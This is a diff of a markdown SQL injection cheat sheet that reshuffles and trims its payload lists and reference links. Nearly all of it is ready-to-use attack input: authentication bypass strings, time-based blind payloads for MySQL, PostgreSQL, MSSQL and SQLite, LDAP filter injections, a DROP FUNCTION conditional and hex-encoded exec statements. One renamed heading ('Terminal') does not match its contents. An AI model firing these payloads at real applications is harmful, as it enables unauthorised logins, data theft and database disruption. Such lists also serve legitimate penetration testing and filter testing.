@@ -11,48 +11,25 @@ A SQL Injection attack consists of the insertion or injection of a SQL query via
 
 ###  Auth Bypass Payloads
 ```
-'
-''
-`
-``
-,
-"
-""
-/
-//
-\
-\\
-;
-'-'
-' '
-'&'
-'^'
-'*'
-"^"
-"*"
-|
 %7C
-*|
 %27
-?
-!
 //*
 ||'6
 */*
-)
-
 %27
-" / %22
-; / %3B
-" / %22
-; / %3B
 %%2727
 %25%27
 `+HERP
+" / %22
+; / %3B
+" / %22
+; / %3B
 '||'DERP
 '+'herp
 ' ' DERP
 
+-- or # 
+' or "
 ' or ''-'
 ' or '' '
 ' or ''&'
@@ -69,57 +46,55 @@ or true--
 ") or true--
 ') or true--
 ' or 'x'='x
-') or ('x')=('x
-')) or (('x'))=(('x
 " or "x"="x
+') or ('x')=('x
 ") or ("x")=("x
+')) or (('x'))=(('x
 ")) or (("x"))=(("x
-' or "
--- or # 
+
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+or 0=0 #"
+' or 1=1
+' or 0=0 #
+' or 1=1--
+' or 1 --'
+' or a=a--
+' or 0=0 --
+ or 1=1 --
+' or '1'='1'--
+' or 1=1 or ''='
+or 1=1 or ""=
+') or ('a'='a
+
+' OR '' = '
 ' OR '1
 ' OR 1 -- -
 " OR "" = "
 " OR 1 = 1 -- -
 ' OR '' = '
  OR 1/*
- or 1=1
-or 1=1--
-or 1=1#
-or 1=1/*
-' OR '' = '
-' or 0=0 --
-' or 0=0 #
- or 0=0 #"
-' or 1=1--
-' or '1'='1'--
-' or 1 --'
-' or 1=1
- or 1=1 --
-or 1=1--
-' or 1=1 or ''='
- or 1=1 or ""=
-' or a=a--
- or a=a
-') or ('a'='a
-
+ 
+1*56
+-2
 '='
 %00
+1-false
+1-true
 'LIKE'
 '=0--+
- OR 1=1
-' OR 'x'='x
-'hi' or 'x'='x';
-' AND id IS NULL; --
-'''''''''''''UNION SELECT '2
-
+OR 1=1
 AND 1
 AND 0
 AND true
 AND false
-1-false
-1-true
-1*56
--2
+' OR 'x'='x
+'hi' or 'x'='x';
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2
+' GROUP BY columnnames having 1=1 --
 
 1' ORDER BY 1--+
 1' ORDER BY 2--+
@@ -128,7 +103,6 @@ AND false
 1' ORDER BY 1,2,3--+
 1' GROUP BY 1,2,--+
 1' GROUP BY 1,2,3--+
-' GROUP BY columnnames having 1=1 --
 
 admin' --
 admin' #
@@ -169,7 +143,27 @@ admin"or 1=1 or ""="
 
 ### Time Based Payloads
 ```
-sleep(5)#
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)
+or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+AnD SLEEP(5)
+AnD SLEEP(5)--
+AnD SLEEP(5)#
+&&SLEEP(5)
+&&SLEEP(5)--
+&&SLEEP(5)#
 1 or sleep(5)#
 " or sleep(5)#
 ' or sleep(5)#
@@ -181,6 +175,24 @@ sleep(5)#
 1)) or sleep(5)#
 ")) or sleep(5)="
 ')) or sleep(5)='
+
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)--
+ORDER BY SLEEP(5)#
+
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
 
 ;waitfor delay '0:0:5'--
 );waitfor delay '0:0:5'--
@@ -210,16 +222,9 @@ benchmark(10000000,MD5(1))#
 ')) or benchmark(10000000,MD5(1))#
 +benchmark(3200,SHA1(1))+'
 
-pg_sleep(5)--
-1 or pg_sleep(5)--
-" or pg_sleep(5)--
-' or pg_sleep(5)--
-1) or pg_sleep(5)--
-") or pg_sleep(5)--
-') or pg_sleep(5)--
-1)) or pg_sleep(5)--
-")) or pg_sleep(5)--
-')) or pg_sleep(5)--
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
 
 AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
 AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
@@ -227,42 +232,9 @@ AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
 
-SLEEP(5)#
-SLEEP(5)--
-SLEEP(5)="
-SLEEP(5)='
-or SLEEP(5)
-or SLEEP(5)#
-or SLEEP(5)--
-or SLEEP(5)="
-or SLEEP(5)='
-pg_SLEEP(5)
-pg_SLEEP(5)--
-pg_SLEEP(5)#
-or pg_SLEEP(5)
-or pg_SLEEP(5)--
-or pg_SLEEP(5)#
-AnD SLEEP(5)
-AnD SLEEP(5)--
-AnD SLEEP(5)#
-&&SLEEP(5)
-&&SLEEP(5)--
-&&SLEEP(5)#
++ SLEEP(10) + '
 ' AnD SLEEP(5) ANd '1
 '&&SLEEP(5)&&'1
-ORDER BY SLEEP(5)
-ORDER BY SLEEP(5)--
-ORDER BY SLEEP(5)#
-
-waitfor delay '00:00:05'
-waitfor delay '00:00:05'--
-waitfor delay '00:00:05'#
-
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
-(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
-
-+ SLEEP(10) + '
 RANDOMBLOB(500000000/2)
 AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
@@ -321,7 +293,7 @@ IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
 IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
 ```
 
-### Hash, Hexadecimal & URL Payloads
+### Hash, Terminal & URL Payloads
 ```
 ' or username like '%
 ' or uname like '%
@@ -350,9 +322,9 @@ tz_offset
 %20'sleep%2050'
 char%4039%41%2b%40SELECT
 &apos;%20OR
+%2A%7C
 'sqlattempt1
 (sqlattempt2)
-%2A%7C
 *(|(mail=*))
 %2A%28%7C%28mail%3D%2A%29%29
 *(|(objectclass=*))
@@ -567,7 +539,7 @@ declare @q nvarchar (200) 0x730065006c006500630074002000400040007600650072007300
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
 ```
 
-### Dangerous Requests (Big Guns)
+### Dangerous Requests
 ```
 ' OR '' = '
 
@@ -585,18 +557,9 @@ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(
 ## References & Other Resoureces
 MySQL:
 - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
-- https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/
 - http://evilsql.com/main/page2.php
-- http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
-
-Oracle:
 - http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
-
-PostgreSQL:
 - http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
-
-GitHub Respositories:
 - https://github.com/adamalston/SQL-Injection
-- https://github.com/omurugur/SQL_Injection_Payload
 - https://github.com/xmendez/wfuzz
-- https://github.com/soufianetahiri/sqlmap-cheat-sheet
+
